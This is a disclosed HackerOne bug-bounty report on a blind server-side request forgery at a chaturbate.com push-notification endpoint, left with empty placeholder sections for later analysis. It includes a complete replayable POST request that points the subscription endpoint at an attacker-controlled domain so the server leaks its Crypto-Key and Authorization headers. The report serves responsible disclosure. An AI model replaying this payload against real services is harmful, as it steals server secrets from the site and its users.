---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '411865'
original_report_id: '411865'
title: Blind SSRF at https://chaturbate.com/notifications/update_push/
weakness: Server-Side Request Forgery (SSRF)
team_handle: chaturbate
created_at: '2018-09-20T17:04:29.167Z'
disclosed_at: '2018-10-21T05:11:44.913Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 49
asset_identifier: chaturbate.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# Blind SSRF at https://chaturbate.com/notifications/update_push/

## Metadata

- HackerOne Report ID: 411865
- Weakness: Server-Side Request Forgery (SSRF)
- Program: chaturbate
- Disclosed At: 2018-10-21T05:11:44.913Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

In the application at https://chaturbate.com/notifications/update_push/ there is a functionality to subscribe any cam model which will trigger the provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server

Steps to Replicate the submission:-

Login to your https://chaturbate.com/ account or use my account-
USERNAME-██████████
PASSWORD-███████

Now click on profile, or trigger any request so that you can get your Cookie / CSRF token.

Send any request to repeater and replace it with the provided request

POST /notifications/update_push/ HTTP/1.1
Host: chaturbate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://chaturbate.com/princesscin/
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: YOURCSRFHERE
X-Requested-With: XMLHttpRequest
Content-Length: 408
Cookie: YOURCOOKIEHERE
Connection: close

subscription={"endpoint":"http:\/\/███\/wpush\/v2\/████&unsub=false

As you can see that I have changed the actual URL to my domain ████████, so that I can get the actual request send to the server.

Put your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request

Go to this URL to confirm SSRF at - http://████████████
you will find that your Crypto-Key, Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.
These headers are very sensitive to be leaked and hence needs to be fixed as soon as possible.

##Note
The application do not require to send the URL along with the domain, it is secure to only send the Rest part of the URL and do not include the domain so that the attacker could not control the complete request.

Thanks

Regards
Robin Ooklay

## Impact

Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
